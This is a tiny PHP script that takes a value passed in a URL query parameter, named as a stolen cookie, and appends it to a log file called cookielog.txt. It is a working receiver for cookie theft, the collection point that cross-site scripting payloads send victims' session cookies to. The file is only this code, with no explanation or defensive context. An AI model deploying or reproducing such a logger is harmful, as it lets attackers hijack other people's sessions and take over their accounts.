<?php


$cookie = $_GET["test"];
$file = fopen('cookielog.txt', 'a');
fwrite($file, $cookie . "\n\n");

?>